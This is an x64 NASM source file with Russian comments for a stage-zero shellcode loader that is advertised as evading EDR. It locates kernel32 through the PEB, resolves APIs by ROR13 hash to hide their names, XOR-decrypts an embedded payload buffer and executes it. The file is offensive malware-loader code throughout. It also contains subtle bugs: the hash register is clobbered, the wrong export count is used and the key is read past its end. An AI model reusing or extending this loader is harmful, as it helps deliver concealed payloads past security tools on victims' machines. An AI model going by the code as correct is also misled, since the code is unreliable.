; stage0.asm - Минимальный загрузчик шелл-кода с обходом EDR
; Компиляция: nasm -f bin -o loader.bin stage0.asm

BITS 64
global _start

_start:
    ; Сохраняем регистры
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x30
    
    ; Обход ASLR и EDR мониторинга, получаем PEB
    mov     r12, qword [gs:0x60]        ; Указатель на PEB
    
    ; Получаем LDR_DATA
    mov     r12, qword [r12 + 0x18]     ; PEB->Ldr
    mov     r13, qword [r12 + 0x10]     ; PEB->Ldr.InLoadOrderModuleList.Flink
    
    ; Первый модуль - текущий исполняемый файл
    ; Второй модуль - ntdll.dll, третий - kernel32.dll
    mov     r13, qword [r13]            ; Следующий модуль (ntdll.dll)
    mov     r13, qword [r13]            ; Следующий модуль (kernel32.dll)
    
    ; Получаем базу kernel32.dll
    mov     r14, qword [r13 + 0x30]     ; Базовый адрес модуля
    
    ; Тут начинаем искать GetProcAddress и LoadLibraryA через хеш-поиск
    ; Чтобы избежать строк в бинаре
    
    ; Хеш GetProcAddress = 0xDF7D9BAD (пример)
    mov     rcx, r14                   ; Базовый адрес kernel32.dll
    mov     edx, 0xDF7D9BAD            ; Хеш GetProcAddress
    call    find_function_hash
    mov     r15, rax                   ; r15 = GetProcAddress
    
    ; Хеш LoadLibraryA = 0xDD9521A6 (пример)
    mov     rcx, r14                   ; Базовый адрес kernel32.dll
    mov     edx, 0xDD9521A6            ; Хеш LoadLibraryA
    call    find_function_hash
    mov     rbx, rax                   ; rbx = LoadLibraryA
    
    ; Загружаем нужные библиотеки для полезной нагрузки
    lea     rcx, [rel str_advapi32]
    call    rbx                        ; LoadLibraryA("advapi32.dll")
    
    ; Расшифровываем полезную нагрузку
    lea     rsi, [rel encrypted_payload]
    mov     rcx, qword [rel payload_size]
    lea     rdx, [rel encryption_key]
    mov     r8, qword [rel key_size]
    call    decrypt_payload
    
    ; Выполняем расшифрованную полезную нагрузку
    lea     rax, [rel decrypted_payload]
    call    rax
    
    ; Завершаем работу
    add     rsp, 0x30
    pop     rbp
    ret

; Функция поиска адреса API по хешу
find_function_hash:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rdi
    
    ; rcx = базовый адрес DLL, edx = хеш функции
    
    ; Получаем DOS-заголовок
    mov     rbx, rcx
    
    ; Получаем NT-заголовок
    mov     eax, dword [rbx + 0x3C]   ; e_lfanew
    add     rax, rbx                  ; RVA -> VA
    
    ; Получаем таблицу экспорта
    mov     eax, dword [rax + 0x88]   ; OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add     rax, rbx                  ; RVA -> VA
    
    ; Получаем адреса таблиц
    mov     ecx, dword [rax + 0x1C]   ; Export Address Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r10, rcx                  ; Сохраняем EAT
    
    mov     ecx, dword [rax + 0x20]   ; Name Pointer Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r11, rcx                  ; Сохраняем NPT
    
    mov     ecx, dword [rax + 0x24]   ; Ordinal Table RVA
    add     rcx, rbx                  ; RVA -> VA
    mov     r12, rcx                  ; Сохраняем OT
    
    mov     ecx, dword [rax + 0x14]   ; NumberOfFunctions
    xor     rdi, rdi
    
find_loop:
    push    rcx                      ; Сохраняем счетчик
    
    ; Получаем имя функции
    mov     ecx, dword [r11 + rdi*4]  ; Получаем RVA имени функции
    add     rcx, rbx                  ; RVA -> VA
    
    ; Вычисляем хеш имени
    call    calc_hash
    
    ; Сравниваем с искомым хешем
    cmp     eax, edx
    je      found_function
    
    ; Если не совпало, идем к следующей функции
    inc     rdi
    pop     rcx
    loop    find_loop
    
    ; Функция не найдена
    xor     rax, rax
    jmp     exit_find
    
found_function:
    ; Найдена функция, получаем ее адрес
    mov     cx, word [r12 + rdi*2]    ; Порядковый номер
    mov     eax, dword [r10 + rcx*4]  ; RVA функции
    add     rax, rbx                  ; RVA -> VA
    
exit_find:
    pop     rcx                       ; Восстанавливаем счетчик
    pop     rdi
    pop     rbx
    pop     rbp
    ret

; Вычисление хеша имени функции
calc_hash:
    push    rbp
    mov     rbp, rsp
    
    xor     eax, eax                  ; Исходный хеш = 0
    
hash_loop:
    movzx   edx, byte [rcx]           ; Берем байт из имени
    test    dl, dl
    jz      hash_done                 ; Если 0, имя закончилось
    
    ; Обновляем хеш (простая функция ROR13 + XOR)
    or      dl, 0x20                  ; Приводим к нижнему регистру
    ror     eax, 13
    add     eax, edx
    
    inc     rcx
    jmp     hash_loop
    
hash_done:
    pop     rbp
    ret

; Расшифровка полезной нагрузки
decrypt_payload:
    push    rbp
    mov     rbp, rsp
    
    ; rsi = адрес зашифрованной нагрузки
    ; rcx = размер нагрузки
    ; rdx = ключ
    ; r8 = размер ключа
    
    lea     rdi, [rel decrypted_payload]
    xor     rbx, rbx                  ; Счетчик
    
decrypt_loop:
    movzx   rax, byte [rdx + rbx]
    xor     al, byte [rsi + rbx]      ; XOR с ключом
    xor     al, bl                    ; XOR с позицией
    xor     al, 0xAA                  ; Дополнительный XOR
    mov     [rdi + rbx], al           ; Сохраняем расшифрованный байт
    
    inc     rbx
    cmp     rbx, rcx
    jb      decrypt_loop
    
    pop     rbp
    ret

; Данные
align 8
str_advapi32:
    db 'advapi32.dll', 0

; Информация о ключе шифрования
key_size:
    dq 16  ; 16 байт

; Ключ шифрования
encryption_key:
    db 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE
    db 0x13, 0x37, 0xC0, 0xDE, 0xF0, 0x0D, 0xFE, 0xED

; Размер полезной нагрузки
payload_size:
    dq 512  ; Размер в байтах

; Зашифрованная полезная нагрузка (будет заполнена билдером)
encrypted_payload:
    db 512 dup(0)  ; Заглушка для полезной нагрузки

; Место для расшифрованной полезной нагрузки
decrypted_payload:
    db 512 dup(0)  ; Буфер для расшифрованной полезной нагрузки